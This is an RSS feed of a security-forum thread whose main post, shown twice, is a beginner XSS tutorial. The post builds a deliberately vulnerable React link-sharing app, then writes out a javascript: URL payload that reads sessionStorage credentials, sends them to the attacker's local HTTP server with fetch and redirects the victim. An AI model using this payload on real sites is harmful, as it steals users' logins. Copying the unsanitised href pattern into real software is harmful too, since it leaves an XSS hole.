@@ -1,0 +1,407 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>My first attempt at XSS</title>
+    <link>https://0x00sec.org/t/my-first-attempt-at-xss/13871</link>
+    <description>As some of you might know, I&#39;m planning to document my journey coming from software development to infosec. This is the first post in the series, I&#39;d be happy for you to give me your _honest_ opinion.
+
+
+So, as a developer, I&#39;ve heard of [OWASP TOP 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project), let&#39;s pick an example from there - XSS looks interesting and maybe I can create a simple app to break.
+
+### What is XSS?
+
+[OWASP](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) says:
+
+&gt; Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. 
+
+So the gist of it is that through a user input, it&#39;s possible to embed code that can be executed, let&#39;s try that.
+
+I&#39;ve learned that both React and Angular (two major players in the front-end framework scene at the time of writing this post)
+tries to protect against XSS out of the box, and as a developer you&#39;ll have to explicitly trust content before allowing the browser to execute it without further sanitation.
+It makes the demonstration harder, but not impossible.
+
+I&#39;ve cooked up a React app that allows you to enter a URL and share it with someone else - let&#39;s imagine that it makes sense, like it tracks who clicks, and who closes it without checking out your awesome fortnite videos. It&#39;s a great way to tell who your _real_ friends are™.
+
+```javascript
+import React from &#39;react&#39;;
+import &#39;./App.css&#39;;
+
+function login() {
+  sessionStorage.setItem(&#39;auth&#39;, &#39;c25haWw6aHVudGVyMg==&#39;);
+}
+
+function getSharedUrl() {
+  return window.location.hash.split(&#39;#&#39;)[1];
+}
+
+function App() {
+  login();
+  const sharedUrl = getSharedUrl();
+  const defaultUrl = &#39;http://www.google.com&#39;;
+  const [link, setLink] = React.useState(sharedUrl || defaultUrl);
+
+  return (
+    &lt;main className=&quot;main&quot;&gt;
+      &lt;h1&gt;Awesome Link Creator&lt;/h1&gt;
+      {!!sharedUrl ?
+        null :
+        &lt;input
+          type=&quot;text&quot;
+          value={link}
+          onChange={event =&gt; setLink(event.target.value)}
+        /&gt;
+      }
+      &lt;br/&gt;
+      &lt;a href={link}&gt;My awesome link!&lt;/a&gt;
+      &lt;br/&gt;
+      &lt;p&gt;
+        &lt;b&gt;Share it with your friends!&lt;/b&gt;
+      &lt;/p&gt;
+      &lt;span className=&quot;shareable-url&quot;&gt;{window.location.origin}#{link}&lt;/span&gt;
+    &lt;/main&gt;
+  );
+}
+
+export default App;
+```
+
+If you&#39;re not much into React or front-end development, here&#39;s some explanation about the code above:
+
+```javascript
+/*
+ This is called a React hook - without going into the details,
+ this provides us a way of setting an initial value to the variable &quot;link&quot;
+ and also gives us a programmatic way of setting its value
+*/ 
+const [link, setLink] = React.useState(sharedUrl || defaultUrl);
+```
+
+```javascript
+/*
+ We set the input&#39;s value to be &quot;link&quot; and 
+ every time a change event is dispatched from the input
+ we will set link to be equal to the current value of the input
+ */
+&lt;input
+  type=&quot;text&quot;
+  value={link}
+  onChange={event =&gt; setLink(event.target.value)}
+/&gt;
+```
+
+```javascript
+/*
+ This will be the actual vulnerability here
+ */
+ &lt;a href={link}&gt;My awesome link!&lt;/a&gt;
+```
+
+Right, so we fire up our browser, and see a beautiful, carefully designed, UX award winning application:
+
+![a screenshot of an application with an input](https://hacker-snail.github.io/blog/static/987b7e7fcc0693051d21a368361f0934/566ea/01_app_normal.png)
+
+But how do we know if it&#39;s vulnerable to XSS? The description of XSS mentions something like 
+&gt;occur anywhere a web application uses input from a user 
+
+Let&#39;s try that then, but still, _how_ would we know?
+It&#39;s a common practice to call the javascript function `alert()` with any argument, like the number `1` - this will tell us if we can continue our research.
+If you look at the screenshot, you can see that there&#39;s a shareable URL at the bottom of the page - with the app&#39;s source code above, we know that it&#39;ll generate a link with the user&#39;s input.
+
+That means we need a small addition to our `alert(1)` test, which is to tell the browser to execute it as javascript. We can achieve this by prefixing it with javascript, so the final input will be `javascript:alert(1)`
+
+![application with an input of javascript:alert(1)](https://hacker-snail.github.io/blog/static/331f768523660f58868643d4e8186013/68051/02_basic_command.png)
+
+And yes, if we click &quot;My awesome link!&quot;, we&#39;ll see 1 in a popup.
+
+![javascript popup showing 1](https://hacker-snail.github.io/blog/static/399b0459e2c9106ac12b29881d99d0e7/4961f/03_xss_success.png)
+
+Now, this is good, we know there&#39;s an XSS vulnerability on this page, we can wrap up, thanks for the atte… hold on…
+
+A [brilliant read](https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4) by Luke Stephens points out that this doesn&#39;t demonstrate well the severity of XSS in modern applications, and he&#39;s right, so let&#39;s see what else we can do.
+
+It&#39;s common practice to store some kind of data in either:
+* cookies
+* local storage
+* session storage
+* memory
+
+Let&#39;s see if we have any luck with the above, I&#39;ll open up the developer console in my browser, and see if there&#39;s anything
+
+![empty browser localstorage and some authentication in sessionStorage](https://hacker-snail.github.io/blog/static/ca0696d778be56f6e62bf88b1aac00c3/faf7c/04_storages.png)
+
+That `auth` seems useful, but it&#39;s our own, and we most likely know our own credentials, so not very helpful. 
+If we think a bit more, we realise that we can probably send a link to others, so we can access **their** credentials.
+
+Let&#39;s see how could we extract it - we know it&#39;s stored in `sessionStorage`, so we can either write
+```javascript
+javascript:alert(window.sessionStorage.getItem(&#39;auth&#39;));
+
+// or we can just dump the whole object, maybe there&#39;s more for other users 
+
+javascript:alert(Object.entries(window.sessionStorage))
+```
+ 
+![popup with the contents of sessionStorage](https://hacker-snail.github.io/blog/static/290353f119ff8c2080cedbd99dd1f304/9a69f/05_object_entries.png)
+
+We&#39;d still have to find a way to send this data to ourselves, and an alert is probably going to _literally alert_ people. Let&#39;s face it, it&#39;s not very subtle.
+
+I thought of firing up python&#39;s `SimpleHttpServer` by issuing this command `python3 -m http.server` in my terminal.
+
+Next thing is to make a request to it, that&#39;ll leave us with something like
+
+```javascript
+javascript:fetch(&#39;http://localhost:8000?params=&#39; + Object.entries(window.sessionStorage), {mode: &#39;no-cors&#39;})
+```
+
+Almost there, but the link in the app wouldn&#39;t work, so while it&#39;s better than the above, it still wouldn&#39;t go unnoticed, as users wouldn&#39;t be redirected anywhere.
+
+```javascript
+javascript:fetch(&#39;http://localhost:8000?params=&#39; + Object.entries(window.sessionStorage), {mode: &#39;no-cors&#39;}).then(() =&gt; window.location.replace(&#39;http://facebook.com&#39;))
+```
+
+Much better! We&#39;ll use [`fetch(url, options)`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) to initiate a request to our server (we could even post the data as the body, but a simple `GET` will do fine in this example), and once that&#39;s finished, we&#39;ll send the user away!
+
+![redirected to facebook with the request to our server](https://hacker-snail.github.io/blog/static/01949d8ee68ec1d20ba99c221412cc2f/46606/06_successful_redirection.png)
+
+As you can see above, we&#39;ve been redirected, but the network tab shows that our request has been made first, and indeed
+
+![logs in terminal and base64 decoded user credentials](https://hacker-snail.github.io/blog/static/116461aabedfb51003fa13f711c219b4/46606/07_caught_request.png)
+
+we received the request containing the credentials. 
+It&#39;s common to use Base64 encoded string as the credentials (in the format of `user:password`) for Basic authentication headers, and whenever I see `=` at the end of a string, I always assume that it&#39;s a Base64 encoded string, so let&#39;s check if we can decrypt it (see above).
+We succeed, and we get a username and a password for that account.
+
+Now we&#39;ve gone from 
+&gt; The app is vulnerable to XSS
+
+all the way to
+&gt; It&#39;s possible to get all users&#39; credentials with a single link
+
+Thanks for reading - feel free to [@ me on Twitter](https://twitter.com/hacker_snail) to share your thoughts or you can just do it here. I&#39;ll be mirroring these posts on my blog @ https://hacker-snail.github.io/</description>
+    
+    <lastBuildDate>Fri, 09 Sep 2022 13:08:47 +0000</lastBuildDate>
+    <category>Beginner Guides</category>
+    <atom:link href="https://0x00sec.org/t/my-first-attempt-at-xss/13871.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>My first attempt at XSS</title>
+        <dc:creator><![CDATA[ramen_hacur]]></dc:creator>
+        <description><![CDATA[
+            <p>These <strong><a href="https://labs.sssecurity.org/" rel="noopener nofollow ugc">XSS labs for practice</a></strong> is awesome BUT now admin attach adds on site… can i get the same without adds ? can i run the website without adds ?</p>
+<p>Again… XSS labs are awesome… try it out.</p>
+          <p><a href="https://0x00sec.org/t/my-first-attempt-at-xss/13871/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/my-first-attempt-at-xss/13871/8</link>
+        <pubDate>Fri, 09 Sep 2022 13:08:47 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-13871-8</guid>
+        <source url="https://0x00sec.org/t/my-first-attempt-at-xss/13871.rss">My first attempt at XSS</source>
+      </item>
+      <item>
+        <title>My first attempt at XSS</title>
+        <dc:creator><![CDATA[0x55a]]></dc:creator>
+        <description><![CDATA[
+            <p>Images are broken i cannot see the anything</p>
+          <p><a href="https://0x00sec.org/t/my-first-attempt-at-xss/13871/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/my-first-attempt-at-xss/13871/6</link>
+        <pubDate>Mon, 13 Apr 2020 17:56:53 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-13871-6</guid>
+        <source url="https://0x00sec.org/t/my-first-attempt-at-xss/13871.rss">My first attempt at XSS</source>
+      </item>
+      <item>
+        <title>My first attempt at XSS</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>Hey <a class="mention" href="https://0x00sec.org/u/hacker_snail">@hacker_snail</a> - your images are broken dude!</p>
+          <p><a href="https://0x00sec.org/t/my-first-attempt-at-xss/13871/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/my-first-attempt-at-xss/13871/5</link>
+        <pubDate>Wed, 08 Apr 2020 12:27:01 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-13871-5</guid>
+        <source url="https://0x00sec.org/t/my-first-attempt-at-xss/13871.rss">My first attempt at XSS</source>
+      </item>
+      <item>
+        <title>My first attempt at XSS</title>
+        <dc:creator><![CDATA[jay_darive]]></dc:creator>
+        <description><![CDATA[
+            <p>Great Topic, thanks a lot <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+          <p><a href="https://0x00sec.org/t/my-first-attempt-at-xss/13871/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/my-first-attempt-at-xss/13871/4</link>
+        <pubDate>Wed, 08 Apr 2020 11:16:19 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-13871-4</guid>
+        <source url="https://0x00sec.org/t/my-first-attempt-at-xss/13871.rss">My first attempt at XSS</source>
+      </item>
+      <item>
+        <title>My first attempt at XSS</title>
+        <dc:creator><![CDATA[hacker_snail]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks! I’m looking forward to your write-up, let’s see if I can make it work before the deadline!</p>
+          <p><a href="https://0x00sec.org/t/my-first-attempt-at-xss/13871/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/my-first-attempt-at-xss/13871/3</link>
+        <pubDate>Fri, 24 May 2019 08:55:05 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-13871-3</guid>
+        <source url="https://0x00sec.org/t/my-first-attempt-at-xss/13871.rss">My first attempt at XSS</source>
+      </item>
+      <item>
+        <title>My first attempt at XSS</title>
+        <dc:creator><![CDATA[hasp0t]]></dc:creator>
+        <description><![CDATA[
+            <p>Hey <a class="mention" href="https://0x00sec.org/u/hacker_snail">@hacker_snail</a>! Very nice introduction to XSS and the potential harm of it.</p>
+<p>It turns out I will post a solution to an XSS challenge today. Feel free to try it yourself first <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"><br>
+<a href="https://challenge.intigriti.io/2" rel="noopener nofollow ugc">Link</a> to the challenge.</p>
+          <p><a href="https://0x00sec.org/t/my-first-attempt-at-xss/13871/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/my-first-attempt-at-xss/13871/2</link>
+        <pubDate>Fri, 24 May 2019 08:33:25 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-13871-2</guid>
+        <source url="https://0x00sec.org/t/my-first-attempt-at-xss/13871.rss">My first attempt at XSS</source>
+      </item>
+      <item>
+        <title>My first attempt at XSS</title>
+        <dc:creator><![CDATA[hacker_snail]]></dc:creator>
+        <description><![CDATA[
+            <p>As some of you might know, I’m planning to document my journey coming from software development to infosec. This is the first post in the series, I’d be happy for you to give me your <em>honest</em> opinion.</p>
+<p>So, as a developer, I’ve heard of <a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" rel="nofollow noopener">OWASP TOP 10</a>, let’s pick an example from there - XSS looks interesting and maybe I can create a simple app to break.</p>
+<h3>What is XSS?</h3>
+<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" rel="nofollow noopener">OWASP</a> says:</p>
+<blockquote>
+<p>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.</p>
+</blockquote>
+<p>So the gist of it is that through a user input, it’s possible to embed code that can be executed, let’s try that.</p>
+<p>I’ve learned that both React and Angular (two major players in the front-end framework scene at the time of writing this post)<br>
+tries to protect against XSS out of the box, and as a developer you’ll have to explicitly trust content before allowing the browser to execute it without further sanitation.<br>
+It makes the demonstration harder, but not impossible.</p>
+<p>I’ve cooked up a React app that allows you to enter a URL and share it with someone else - let’s imagine that it makes sense, like it tracks who clicks, and who closes it without checking out your awesome fortnite videos. It’s a great way to tell who your <em>real</em> friends are™.</p>
+<pre><code class="lang-javascript">import React from 'react';
+import './App.css';
+
+function login() {
+  sessionStorage.setItem('auth', 'c25haWw6aHVudGVyMg==');
+}
+
+function getSharedUrl() {
+  return window.location.hash.split('#')[1];
+}
+
+function App() {
+  login();
+  const sharedUrl = getSharedUrl();
+  const defaultUrl = 'http://www.google.com';
+  const [link, setLink] = React.useState(sharedUrl || defaultUrl);
+
+  return (
+    &lt;main className="main"&gt;
+      &lt;h1&gt;Awesome Link Creator&lt;/h1&gt;
+      {!!sharedUrl ?
+        null :
+        &lt;input
+          type="text"
+          value={link}
+          onChange={event =&gt; setLink(event.target.value)}
+        /&gt;
+      }
+      &lt;br/&gt;
+      &lt;a href={link}&gt;My awesome link!&lt;/a&gt;
+      &lt;br/&gt;
+      &lt;p&gt;
+        &lt;b&gt;Share it with your friends!&lt;/b&gt;
+      &lt;/p&gt;
+      &lt;span className="shareable-url"&gt;{window.location.origin}#{link}&lt;/span&gt;
+    &lt;/main&gt;
+  );
+}
+
+export default App;
+</code></pre>
+<p>If you’re not much into React or front-end development, here’s some explanation about the code above:</p>
+<pre><code class="lang-javascript">/*
+ This is called a React hook - without going into the details,
+ this provides us a way of setting an initial value to the variable "link"
+ and also gives us a programmatic way of setting its value
+*/ 
+const [link, setLink] = React.useState(sharedUrl || defaultUrl);
+</code></pre>
+<pre><code class="lang-javascript">/*
+ We set the input's value to be "link" and 
+ every time a change event is dispatched from the input
+ we will set link to be equal to the current value of the input
+ */
+&lt;input
+  type="text"
+  value={link}
+  onChange={event =&gt; setLink(event.target.value)}
+/&gt;
+</code></pre>
+<pre><code class="lang-javascript">/*
+ This will be the actual vulnerability here
+ */
+ &lt;a href={link}&gt;My awesome link!&lt;/a&gt;
+</code></pre>
+<p>Right, so we fire up our browser, and see a beautiful, carefully designed, UX award winning application:</p>
+<p><span alt="a screenshot of an application with an input" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>But how do we know if it’s vulnerable to XSS? The description of XSS mentions something like</p>
+<blockquote>
+<p>occur anywhere a web application uses input from a user</p>
+</blockquote>
+<p>Let’s try that then, but still, <em>how</em> would we know?<br>
+It’s a common practice to call the javascript function <code>alert()</code> with any argument, like the number <code>1</code> - this will tell us if we can continue our research.<br>
+If you look at the screenshot, you can see that there’s a shareable URL at the bottom of the page - with the app’s source code above, we know that it’ll generate a link with the user’s input.</p>
+<p>That means we need a small addition to our <code>alert(1)</code> test, which is to tell the browser to execute it as javascript. We can achieve this by prefixing it with javascript, so the final input will be <code>javascript:alert(1)</code></p>
+<p><span alt="application with an input of javascript:alert(1)" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>And yes, if we click “My awesome link!”, we’ll see 1 in a popup.</p>
+<p><span alt="javascript popup showing 1" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>Now, this is good, we know there’s an XSS vulnerability on this page, we can wrap up, thanks for the atte… hold on…</p>
+<p>A <a href="https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4" rel="nofollow noopener">brilliant read</a> by Luke Stephens points out that this doesn’t demonstrate well the severity of XSS in modern applications, and he’s right, so let’s see what else we can do.</p>
+<p>It’s common practice to store some kind of data in either:</p>
+<ul>
+<li>cookies</li>
+<li>local storage</li>
+<li>session storage</li>
+<li>memory</li>
+</ul>
+<p>Let’s see if we have any luck with the above, I’ll open up the developer console in my browser, and see if there’s anything</p>
+<p><span alt="empty browser localstorage and some authentication in sessionStorage" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>That <code>auth</code> seems useful, but it’s our own, and we most likely know our own credentials, so not very helpful.<br>
+If we think a bit more, we realise that we can probably send a link to others, so we can access <strong>their</strong> credentials.</p>
+<p>Let’s see how could we extract it - we know it’s stored in <code>sessionStorage</code>, so we can either write</p>
+<pre><code class="lang-javascript">javascript:alert(window.sessionStorage.getItem('auth'));
+
+// or we can just dump the whole object, maybe there's more for other users 
+
+javascript:alert(Object.entries(window.sessionStorage))
+</code></pre>
+<p><span alt="popup with the contents of sessionStorage" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>We’d still have to find a way to send this data to ourselves, and an alert is probably going to <em>literally alert</em> people. Let’s face it, it’s not very subtle.</p>
+<p>I thought of firing up python’s <code>SimpleHttpServer</code> by issuing this command <code>python3 -m http.server</code> in my terminal.</p>
+<p>Next thing is to make a request to it, that’ll leave us with something like</p>
+<pre><code class="lang-javascript">javascript:fetch('http://localhost:8000?params=' + Object.entries(window.sessionStorage), {mode: 'no-cors'})
+</code></pre>
+<p>Almost there, but the link in the app wouldn’t work, so while it’s better than the above, it still wouldn’t go unnoticed, as users wouldn’t be redirected anywhere.</p>
+<pre><code class="lang-javascript">javascript:fetch('http://localhost:8000?params=' + Object.entries(window.sessionStorage), {mode: 'no-cors'}).then(() =&gt; window.location.replace('http://facebook.com'))
+</code></pre>
+<p>Much better! We’ll use <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch" rel="nofollow noopener"><code>fetch(url, options)</code></a> to initiate a request to our server (we could even post the data as the body, but a simple <code>GET</code> will do fine in this example), and once that’s finished, we’ll send the user away!</p>
+<p><span alt="redirected to facebook with the request to our server" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>As you can see above, we’ve been redirected, but the network tab shows that our request has been made first, and indeed</p>
+<p><span alt="logs in terminal and base64 decoded user credentials" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
+<p>we received the request containing the credentials.<br>
+It’s common to use Base64 encoded string as the credentials (in the format of <code>user:password</code>) for Basic authentication headers, and whenever I see <code>=</code> at the end of a string, I always assume that it’s a Base64 encoded string, so let’s check if we can decrypt it (see above).<br>
+We succeed, and we get a username and a password for that account.</p>
+<p>Now we’ve gone from</p>
+<blockquote>
+<p>The app is vulnerable to XSS</p>
+</blockquote>
+<p>all the way to</p>
+<blockquote>
+<p>It’s possible to get all users’ credentials with a single link</p>
+</blockquote>
+<p>Thanks for reading - feel free to <a href="https://twitter.com/hacker_snail" rel="nofollow noopener">@ me on Twitter</a> to share your thoughts or you can just do it here. I’ll be mirroring these posts on my blog @ <a href="https://hacker-snail.github.io/" rel="nofollow noopener">https://hacker-snail.github.io/</a></p>
+          <p><a href="https://0x00sec.org/t/my-first-attempt-at-xss/13871/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/my-first-attempt-at-xss/13871/1</link>
+        <pubDate>Fri, 24 May 2019 08:25:56 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-13871-1</guid>
+        <source url="https://0x00sec.org/t/my-first-attempt-at-xss/13871.rss">My first attempt at XSS</source>
+      </item>
+  </channel>
+</rss>
